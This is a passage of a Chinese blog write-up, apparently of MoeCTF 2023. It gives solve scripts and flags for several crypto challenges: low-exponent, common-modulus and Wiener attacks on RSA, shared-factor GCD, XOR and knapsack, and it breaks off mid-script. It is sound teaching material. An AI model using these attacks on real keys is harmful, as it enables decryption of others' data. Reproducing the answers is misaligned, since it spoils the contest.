喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？ 喵喵喵喵喵？ 喵喵喵喵喵？喵喵？ 喵喵喵喵喵？ 喵喵喵喵喵喵 喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？喵喵喵 喵喵喵喵喵？ 喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？ 喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？喵喵喵 喵喵喵喵喵？ 喵喵喵喵喵？喵喵喵喵喵喵 喵喵喵喵喵？喵喵喵喵喵喵 喵喵喵 喵喵？喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵？喵喵喵 喵喵？喵喵？喵喵？ 喵喵喵喵喵喵喵喵？ 喵喵？喵喵？喵喵喵喵喵喵 喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵？喵喵喵喵喵？喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵喵喵喵？喵喵喵 喵喵？喵喵喵喵喵喵喵喵？<br></code></pre></td></tr></table></figure><p>Flag:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX&#125;</span><br></code></pre></td></tr></table></figure><p>​     最开始猜测是兽语解密，但尝试了一番，并没有得到flag，同时注意到题目hint：morse code，告诉我们是摩斯密码，故将文本尝试转换成morse code，解得</p><img src="/2024/04/29/moectf2023/clip_image018.png" class title="img"><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h1><h3 id="Crypto-入门指北"><a href="#Crypto-入门指北" class="headerlink" title="Crypto 入门指北"></a><strong>Crypto</strong> <strong>入门指北</strong></h3><p>​    运行脚本得flag</p><p>flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;weLCome_To_moeCTf_CRypTo_And_enjoy_THis_gAme!_THis_is_yoUR_fLAg!&#125;<br></code></pre></td></tr></table></figure><h3 id="baby-e"><a href="#baby-e" class="headerlink" title="baby_e"></a><strong>baby_e</strong></h3><p>​     e很小，可以采用低加密指数攻击</p><img src="/2024/04/29/moectf2023/clip_image020.png" class title="img"><p>编写脚本得</p><p>Flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;SMaLL_3xPon3nt_Mak3_rSa_w3ak!_!lP0iYlJf!M3rux9G9Vf!JoxiMl903lllA&#125;<br></code></pre></td></tr></table></figure><h3 id="bad-E"><a href="#bad-E" class="headerlink" title="bad_E"></a><strong>bad_E</strong></h3><p>非预期脚本：(当时初学Crypto，不知道从那个师傅哪里看到了nthroot_mod这个有限域开方函数，发现还挺好用，一路套脚本😀)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> sympy.ntheory.residue_ntheory import nthroot_mod<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br>e = 65537<br><span class="hljs-attribute">p</span>=6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571<br><span class="hljs-attribute">q</span>=11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819<br><span class="hljs-attribute">c</span>=63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805<br><span class="hljs-attribute">n</span>=p*q<br><span class="hljs-built_in">print</span>(long_to_bytes(nthroot_mod(c,e,p))<br></code></pre></td></tr></table></figure><p>预期解：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">e = 65537<br><span class="hljs-attribute">p</span>=6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571<br><span class="hljs-attribute">q</span>=11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819<br><span class="hljs-attribute">c</span>=63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805<br><span class="hljs-attribute">n</span>=p*q<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><span class="hljs-built_in">print</span>(gcd(e,p-1))   #e|(p-1), gcd(e,q-1)=1<br><span class="hljs-attribute">d</span>=invert(e,(q-1))<br><span class="hljs-attribute">m</span>=powmod(c,d,q)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>Flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;N0w_Y0U_hAve_kN0w_h0w_rsA_w0rks!_f!lP0iYlJf!M3ru&#125;<br></code></pre></td></tr></table></figure><h3 id="xorrrrrrrrr"><a href="#xorrrrrrrrr" class="headerlink" title="xorrrrrrrrr"></a><strong>xorrrrrrrrr</strong></h3><p>​     先拿moectf{去和密文xor，根据密文翻译出来的明文猜测明文后面的单词，再与该段密文xor得到部分flag，重复操作，最终得到完整flag</p><p>Flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;W0W_y0U_HaVe_mastered_tHe_x0r_0Peart0r!_0iYlJf!M3rux9G9Vf!JoxiMl&#125;<br></code></pre></td></tr></table></figure><p><strong>factor_signin</strong></p><p>​    观察代码可知flag为rsa加密，前半部分的n1=p <em> q，后半部分n2=p1 </em> p2 * p3…p32,编写脚本得到两段flag，组合起来</p><p>脚本: </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">from</span> gmpy2 import *<br><br><br><span class="hljs-attribute">p</span>=<span class="hljs-number">18055722101348711626577381571859114850735298658417345663254295930584841136416234624852520581982069555948490061840244710773146585295336094872892685938420880462305333393436098181186277450475949236132458958671804132443554885896037342335902958516394876382378829317303693655605215373555988755516058130500801822723195474873517960624159417903134580987202400855946137101429970119186394052011747475879598126195607938106163892658285305921071673588966184054026228745012993740035399652049777986535759039077634555909031397541116025395236871778797949216479130412500655359057128438928721459688727543057760739527720641179290282309741</span><br><br><span class="hljs-attribute">q</span>=<span class="hljs-number">19024691283015651666032297670418553586155390575928421823630922553034857624430114628839720683172187406577114034710093054198921843669645736474448836706112221787749688565566635453151716934583685087745112614898780150391513798368931496744574075511968933800467288441832780919514199410584786925010518564670786685241724643282580795568609339268652910564215887176803735675069372979560024792322029911970574914829712553975379661212645059271137916107885326625543090473004683836665262304916304580076748336858662108554591235698235221618061328251985929904075811056422186525179189846420226944944513865790999242309352900287977666792901</span><br><br><span class="hljs-attribute">c1</span>=<span class="hljs-number">10004937130983861141937782436252502991050957330184611684406783226971057978666503675149401388381995491152372622456604317681236160071166819028679754762162125904637599991943368450200313304999566592294442696755822585022667008378021280392976010576970877334159755332946926433635584313137140987588847077645814987268595739733550220882135750267567373532603503399428451548677091911410732474324157868011686641243202218731844256789044721309478991918322850448456919991540932206923861653518190974620161055008847475600980152660468279765607319838003177639654115075183493029803981527882155542925959658123816315099271123470754815045214896642428657264709805029840253303446203030294879166242867850331945166255924821406218090304893024711068773287842075208409312312188560675094244318565148284432361706108491327014254387317744284876018328591380705408407853404828189643214087638328376675071962141118973835178054884474523241911240926274907256651801384433652425740230755811160476356172444327762497910600719286629420662696949923799255603628210458906831175806791599965316549386396788014703044837917283461862338269599464440202019922379625071512100821922879623930069349084917919100015782270736808388388006084027673781004085620817521378823838335749279055639005125</span><br><span class="hljs-attribute">e</span>=<span class="hljs-number">65537</span><br><br><span class="hljs-attribute">d1</span>=invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-attribute">m1</span>=powmod(c1,d1,p*q)<br><span class="hljs-attribute">print</span>(long_to_bytes(m1))<br><span class="hljs-attribute">a</span>=[<span class="hljs-number">9949603102225364603</span>,<span class="hljs-number">10049235158029375571</span>,<span class="hljs-number">10547615587767500213</span>,<span class="hljs-number">10596280721192026229</span>,<span class="hljs-number">10864078180916418691</span>,<span class="hljs-number">11092420583960163379</span>,<span class="hljs-number">11853704782834170959</span>,<span class="hljs-number">12034779627328165471</span>,<span class="hljs-number">12404642343676224637</span>,<span class="hljs-number">12448177342966243757</span>,<span class="hljs-number">13062839684118954553</span>,<span class="hljs-number">13645878578452317313</span>,<span class="hljs-number">14397830993057803133</span>,<span class="hljs-number">14619040595108594017</span>,<span class="hljs-number">14678737767649343977</span>,<span class="hljs-number">14745811312384518031</span>,<span class="hljs-number">14813953870710226847</span>,<span class="hljs-number">15175734709842430433</span>,<span class="hljs-number">15211380502610462057</span>,<span class="hljs-number">15332916111580607077</span>,<span class="hljs-number">15751974537676958401</span>,<span class="hljs-number">16123604149048919099</span>,<span class="hljs-number">16408421615173973083</span>,<span class="hljs-number">16870346804576162551</span>,<span class="hljs-number">17093292308638969889</span>,<span class="hljs-number">17265001711647542137</span>,<span class="hljs-number">17289161209347211817</span>,<span class="hljs-number">17543713628803023199</span>,<span class="hljs-number">17673334943789572513</span>,<span class="hljs-number">18106525049998616747</span>,<span class="hljs-number">18345408081492711641</span>,<span class="hljs-number">18390046459144888243</span>]<br><span class="hljs-attribute">c2</span>=<span class="hljs-number">4948422459907576438725352912593232312182623872749480015295307088166392790756090961680588458629287353136729331282506869598853654959933189916541367579979613191505226006688017103736659670745715837820780269669982614187726024837483992949073998289744910800139692315475427811724840888983757813069849711652177078415791290894737059610056340691753379065563574279210755232749774749757141836708161854072798697882671844015773796030086898649043727563289757423417931359190238689436180953442515869613672008678717039516723747808793079592658069533269662834322438864456440701995249381880745586708718334052938634931936240736457181295</span><br><span class="hljs-attribute">n2</span>=<span class="hljs-number">8582505375542551134698364096640878629785534004976071646505285128223700755811329156276289439920192196962008222418309136528180402357612976316670896973298407081310073283979903409463559102445223030866575563539261326076167685019121804961393115251287057504682389257841337573435085535013992761172452417731887700665115563173984357419855481847035192853387338980937451843809282267888616833734087813693242841580644645315837196205981207827105545437201799441352173638172133698491126291396194764373021523547130703629001683366722885529834956411976212381935354905525700646776572036418453784898084635925476199878640087165680193737</span><br><span class="hljs-attribute">phi</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">32</span>):<br>    <span class="hljs-attribute">phi</span> *= a[i]-<span class="hljs-number">1</span><br><span class="hljs-attribute">d2</span>=invert(e,phi)<br><span class="hljs-attribute">m2</span>=powmod(c2,d2,n2)<br><span class="hljs-attribute">print</span>(long_to_bytes(m2))<br></code></pre></td></tr></table></figure><p>flag： </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">moectf&#123;fACtord<span class="hljs-number">6</span>_A<span class="hljs-symbol">nd_YAfu_Are_6</span>oth_good_utils_to_fACtorize_<span class="hljs-symbol">num6</span>ers_ff<span class="hljs-number">90</span>S&#125;<br></code></pre></td></tr></table></figure><h3 id="feistel"><a href="#feistel" class="headerlink" title="feistel"></a><strong>feistel</strong></h3><p>​    将密文明文互换，再用加密脚本加密既可解密出flag</p><img src="/2024/04/29/moectf2023/clip_image022.png" class title="img"><h3 id="n-amp-n"><a href="#n-amp-n" class="headerlink" title="n&amp;n"></a><strong>n&amp;n</strong></h3><p>​    观察代码，得到e1，e2，c1，c2，n，故采用共模攻击</p><p>编写脚本得到flag</p><p>脚本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br>e1 = 0x114514<br>e2 = 19198101<br><span class="hljs-attribute">c1</span>=5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925<br>c2= 4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360<br><span class="hljs-attribute">n</span>=13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531<br><span class="hljs-attribute">s</span>=gcdext(e1,e2)<br><span class="hljs-attribute">s1</span>=s[1]<br><span class="hljs-attribute">s2</span>=s[2]<br><span class="hljs-attribute">m</span>=powmod(c1,s1,n)<br><span class="hljs-attribute">a</span>=powmod(c2,s2,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m<span class="hljs-number">*a</span>%n))<br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;dO_nOt_u53_5AM3_MOdulu5_tO_3ncrYPt_dIFF3r3nt_dAtA!_JY63x33iiA0Ji&#125;</span><br></code></pre></td></tr></table></figure><h3 id="p-q"><a href="#p-q" class="headerlink" title="|p-q|"></a><strong>|p-q|</strong></h3><p>N分解得到p，q，编写rsa解题脚本，得flag</p><p>flag：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;it_iS_vUlnErablE_iF_p_iS_aboUt_thE_SaME_SiZE_aS_Q_MVoAYArrlG3uco&#125;</span><br></code></pre></td></tr></table></figure><h3 id="ez-chain"><a href="#ez-chain" class="headerlink" title="ez_chain"></a><strong>ez_chain</strong></h3><p>​    运用到辗转相除法、cbc加密，但是不知道key，通过构造相同位数的flag，发现flag内容怎么修改，最后的余数都不会变，猜测最后那一部分和moect{有关，修改查看，发现最后一个余数改变，确定猜测，该余数即为blocks[0]，同时已知密文、iv，异或求得key。</p><p>代码:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">a</span>=[<span class="hljs-number">8490961288</span>, <span class="hljs-number">122685644196</span>, <span class="hljs-number">349851982069</span>, <span class="hljs-number">319462619019</span>, <span class="hljs-number">74697733110</span>,<br>   <span class="hljs-attribute">43107579733</span>, <span class="hljs-number">465430019828</span>, <span class="hljs-number">178715374673</span>, <span class="hljs-number">425695308534</span>, <span class="hljs-number">164022852989</span>,<br>   <span class="hljs-attribute">435966065649</span>, <span class="hljs-number">222907886694</span>, <span class="hljs-number">420391941825</span>, <span class="hljs-number">173833246025</span>, <span class="hljs-number">329708930734</span>]<br><span class="hljs-attribute">iv</span> = <span class="hljs-number">3735927943</span><br><span class="hljs-attribute">base</span> = bytes_to_long(b<span class="hljs-string">&quot;koito&quot;</span>)<br><span class="hljs-attribute">key</span>=<span class="hljs-number">5329712293</span>^a[<span class="hljs-number">0</span>]^iv<br><span class="hljs-attribute">b</span>=[iv]<br><span class="hljs-attribute">for</span> i in range(len(a)-<span class="hljs-number">1</span>):<br>    <span class="hljs-attribute">b</span>.append(a[len(a)-<span class="hljs-number">2</span>-i]^a[len(a)-<span class="hljs-number">1</span>-i]^key)<br><span class="hljs-attribute">b</span>.append(a[<span class="hljs-number">0</span>]^b[<span class="hljs-number">0</span>]^key)<br><span class="hljs-attribute">a1</span>=list(reversed(b[<span class="hljs-number">1</span>:]))<br><span class="hljs-attribute">m</span>=a1[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,len(a1)):<br>    <span class="hljs-attribute">m</span> = base*m+a1[i]<br><span class="hljs-attribute">flag</span> = long_to_bytes(m)<br><span class="hljs-attribute">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="minipack"><a href="#minipack" class="headerlink" title="minipack"></a><strong>minipack</strong></h3><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br> key=[]<br> <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;E:\\key.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fs:<br>   key1 = fs.read().split(<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;[&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;]&#x27;</span>)<br> key1[<span class="hljs-number">0</span>]=key1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>:]<br> key1[-<span class="hljs-number">1</span>]=key1[-<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>]<br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key1:<br>   key.append(<span class="hljs-built_in">int</span>(i))<br> key = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">reversed</span>(key))<br> <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;E:\\ciphertext.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fs:<br>   cip = <span class="hljs-built_in">int</span>(fs.read())<br> m = <span class="hljs-string">&#x27;&#x27;</span><br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>   <span class="hljs-keyword">if</span> cip - key[i] &gt;= <span class="hljs-number">0</span>:<br>     cip = cip - key[i]<br>     m += <span class="hljs-string">&#x27;1&#x27;</span><br>   <span class="hljs-keyword">else</span>:<br>     m += <span class="hljs-string">&#x27;0&#x27;</span><br> <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m[::-<span class="hljs-number">1</span>],<span class="hljs-number">2</span>)))<br></code></pre></td></tr></table></figure><h3 id="giant-e"><a href="#giant-e" class="headerlink" title="giant_e"></a><strong>giant_e</strong></h3><p>​    rsa解题，e特别大，采用winerer攻击</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContinuedFraction</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,numerator,denumerator</span>):<br>        self.numberlist = [] <span class="hljs-comment"># number in continued fraction</span><br>        self.fractionlist = [] <span class="hljs-comment"># the near fraction list</span><br>        self.GenerateNumberList (numerator, denumerator)<br>        self.GenerateFractionList ()<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateNumberList</span> (self, numerator, denumerator):<br>        <span class="hljs-keyword">while</span> numerator != <span class="hljs-number">1</span>:<br>            quotient = numerator // denumerator<br>            remainder = numerator % denumerator<br>            self.numberlist.append (quotient)<br>            numerator = denumerator<br>            denumerator = remainder<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateFractionList</span> (self) :<br>        self.fractionlist.append ([self.numberlist[<span class="hljs-number">0</span>], <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span> (self.numberlist)):<br>            numerator = self.numberlist[i]<br>            denumerator = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (i) :<br>                temp = numerator<br>                numerator = denumerator + numerator * self.numberlist[i-j-<span class="hljs-number">1</span>]<br>                denumerator = temp<br>            self.fractionlist.append([numerator, denumerator])<br><br>e = <span class="hljs-number">0x609778981bfbb26bb93398cb6d96984616a6ab08ade090c1c0d4fedb00f44f0552a1555efec5cc66e7960b61e94e80e7483b9f906a6c8155a91cdc3e4917fa5347c58a2bc85bb160fcf7fe98e3645cfea8458ea209e565e4eb72ee7cbb232331a862d8a84d91a0ff6d74aa3c779b2b129c3d8148b090c4193234764f2e5d9b2170a9b4859501d07c0601cdd18616a0ab2cf713a7c785fd06f27d68dff24446d884644e08f31bd37ecf48750e4324f959a8d37c5bef25e1580851646d57b3d4f525bc04c7ddafdf146539a84703df2161a0da7a368675f473065d2cb661907d990ba4a8451b15e054bfc4dd73e134f3bf7d8fa4716125d8e21f946d16b7b0fc43</span><br>n=<span class="hljs-number">0xbaa70ba4c29eb1e6bb3458827540fce84d40e1c966db73c0a39e4f9f40e975c42e02971dab385be27bd2b0687e2476894845cc46e55d9747a5be5ca9d925931ca82b0489e39724ea814800eb3c0ea40d89ebe7fe377f8d3f431a68d209e7a149851c06a4e67db7c99fcfd9ec19496f29d59bb186feb44a36fe344f11d047b9435a1c47fa2f8ed72f59403ebb0e439738fd550a7684247ab7da64311690f461e6dce03bf2fcd55345948a3b537087f07cd680d7461d326690bf21e39dff30268cb33f86eeceff412cd63a38f7110805d337dcad25e6f7e3728b53ca722b695b0d9db37361b5b63213af50dd69ee8b3cf2085f845d7932c08b27bf638e98497239</span><br>c=<span class="hljs-number">0x45a9ce4297c8afee693d3cce2525d3399c5251061ddd2462513a57f0fd69bdc74b71b519d3a2c23209d74fcfbcb6b196b5943838c2441cb34496c96e0f9fc9f0f80a2f6d5b49f220cb3e78e36a4a66595aa2dbe3ff6e814d84f07cb5442e2d5d08d08aa9ccde0294b39bfde79a6c6dcd2329e9820744c4deb34a039da7933ddf00b0a0469afb89cba87490a39783a9b2f8f0274f646ca242e78a326dda886c213bc8d03ac1a9150de4ba08c5936c3fe924c8646652ef85aa7ac0103485f472413427a0e9d9a4d416b99e24861ca8499500c693d7a07360158ffffa543480758cafff2a09a9f6628f92767764fa026d48a9dd899838505ae16e38910697f9de14</span><br>a = ContinuedFraction(e,n)<br><span class="hljs-keyword">for</span> k,d <span class="hljs-keyword">in</span> a.fractionlist:<br>    s = long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(s.decode())<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;too_larGe_exponent_is_not_a_iDea_too!_Bung92WPIBung92WPIBung9?WP&#125;<br></code></pre></td></tr></table></figure><h3 id="rsa-signin"><a href="#rsa-signin" class="headerlink" title="rsa_signin"></a><strong>rsa_signin</strong></h3><p>​    出现多组c，n，可以考虑低加密指数广播攻击，但e=65337，比较大，不使用中国剩余定理，考虑在n_list找最大公因数，编写脚本得flag</p><p>脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>e = <span class="hljs-number">65537</span><br>n1 =<br>…<br>n11 =<br>c1 =<br>…<br>c11 =<br>c = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]<br>n = [n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>        <span class="hljs-keyword">if</span> (i != j):<br>            <span class="hljs-keyword">if</span> (gmpy2.gcd(n[i], n[j]) != <span class="hljs-number">1</span>):  <span class="hljs-comment"># 对不同的n进行 欧几里得算法，以求出最大公约数(p)</span><br>                <span class="hljs-built_in">print</span>(i, j)  <span class="hljs-comment"># 输出对应的n的序号</span><br>                p = gmpy2.gcd(n[i], n[j])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p = &quot;</span>, p)<br>                q = n[i] // p<br>                